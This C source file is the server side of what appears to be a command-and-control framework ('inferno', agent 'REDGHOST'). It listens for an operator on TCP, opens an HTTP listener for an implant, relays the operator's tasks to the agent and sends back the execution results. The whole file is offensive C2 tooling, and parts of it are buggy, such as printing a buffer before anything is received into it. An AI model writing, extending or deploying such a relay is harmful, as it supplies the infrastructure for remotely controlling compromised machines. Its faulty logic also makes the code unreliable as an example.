#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define IP "127.0.0.1"
#define PORT_TCP 33333
#define PORT_HTTP 80

//handle erros
void error(char *message) {
    fprintf(stderr, "%s: %s\n", message, strerror(errno));
    exit(EXIT_FAILURE);
}

//starting the HTTP listener
int http_listener(int http_listener_socket);

//transfering over HTTP payload and receiving payload results
char *http_transfer(int http_listener_accept, char *task);

//the netorking part
void networking(int inferno_socket);

int main() {
    int session = 0;

    //socket tcp
    printf("Initializing socket...\n");
    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (inferno_socket == -1)
        error("Socket creation failed");

    //http socket
    int http_listener_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (http_listener_socket == -1)
        error("HTTP socket creation failed");

    networking(inferno_socket);

    while (1) {
        //accept tcp
        printf("Accepting...\n");
        int inferno_accept = accept(inferno_socket, NULL, NULL);
        if (inferno_accept == -1)
            error("Accepting failed");
        printf("Client connected\n");        

        while (1) {
            //receive from client
            char input[2048];
            printf("Received from client: %s\n", input);
            if (recv(inferno_accept, input, sizeof(input), 0) == -1)
                error("Error receiveing from client");

            char *status;
            int http_listener_accept;
            char *executed;

            //check if client session established
            if (strcmp(input, "ok") == 0) {
                puts("Session started");
                puts("==========START SESSION==========");
                session = 1;
            }

            //check if operator want start HTTP listener
            if (strcmp(input, "http") == 0) {
                //preparing listener
                puts("Preparing HTTP listener");
                http_listener_accept = http_listener(http_listener_socket);
                
                char agent_connected[] = "XXX-AGENT-REDGHOST-XXX";
                if (send(inferno_accept, agent_connected, sizeof(agent_connected), 0) == -1)
                    error("Error sending to client");

                //agent is connected to server
                puts("Agent connected");
                status = "ok";
                strcpy(input, status);
            }

            //handle all client/agent communications
            while (session) {
                char inside[2048];
                puts("==========START PAYLOAD==========");

                //receive from client
                if (recv(inferno_accept, inside, sizeof(inside), 0) == -1)
                    error("Error receiving from client");
                printf("Receiving from client:\n%s\n", inside);

                //transfering (receiving/sending to agent)
                executed = http_transfer(http_listener_accept, inside);
                
                char response[2048];
                sprintf(response, "%s\r\n", executed); 
                
                //sending to client
                if (send(inferno_accept, response, sizeof(response), 0) == -1)
                    error("Error sending to client");
                printf("Sending to client: %s\n", response);
                puts("===========END PAYLOAD===========\n");
            
                // close HTTP accept
                close(http_listener_accept);
            }
            //sending to client
            printf("Sending to client: %s\n", input);
            if (send(inferno_accept, input, sizeof(input), 0) == -1)
                error("Error sending to client");
        }

        //close accept
        close(inferno_accept);

    }

    //close http socket
    printf("Closing HTTP socket...\n");
    if (close(http_listener_socket) == -1)
        error("Failed closing HTTP socket");

    //close
    printf("Closing socket...\n");
    if (close(inferno_socket) == -1)
        error("Failed closing socket");
}

int http_listener(int http_listener_socket) {

    //socket http
    printf("Initializing http listener...\n");

    //preparing http address
    struct sockaddr_in http_listener_address;
    memset(&http_listener_address, 0, sizeof(http_listener_address));
    http_listener_address.sin_family = AF_INET;
    http_listener_address.sin_port = htons(PORT_HTTP);
    http_listener_address.sin_addr.s_addr = inet_addr(IP);
    printf("HTTP listener initialized\n");
    
    //bind http
    printf("Binding http listener...\n");
    if (bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address)) == -1)
        error("Binding HTTP failed");

    //listen http
    printf("Listening...\n");
    if (listen(http_listener_socket, 0) == -1)
        error("Failed listening");

    //accept http
    printf("Accepting...\n");
    int http_listener_accept = accept(http_listener_socket, NULL, NULL);
    if (http_listener_accept == -1)
        error("Failed accepting");

    return http_listener_accept;
}

char *http_transfer(int http_listener_accept, char *task) {
     //sending task to agent
     if (send(http_listener_accept, task, 2048, 0) == -1)
         error("Error sending to agent");
     printf("Sending to agent:\n\n%s\n", task);

     //receiving egent execution
     static char executed[2048];
     if (recv(http_listener_accept, executed, sizeof(executed), 0) == -1)
         error("Error receiving from agent");
     printf("Received from agent: %s\n", executed);

     //return client execution
     return executed;
}

void networking(int inferno_socket) {
    //preparing address tcp
    struct sockaddr_in c2_address;
    memset(&c2_address, 0, sizeof(c2_address));
    c2_address.sin_family = AF_INET;
    c2_address.sin_port = htons(PORT_TCP);
    c2_address.sin_addr.s_addr = inet_addr(IP);

    //bind tcp
    printf("Binding socket to c2 address...\n");
    if (bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
        error("Binding socket failed");

    //listen tcp
    printf("Listening to %s:%d\n", IP, PORT_TCP);
    if (listen(inferno_socket, 0) == -1)
        error("Listening failed");
}
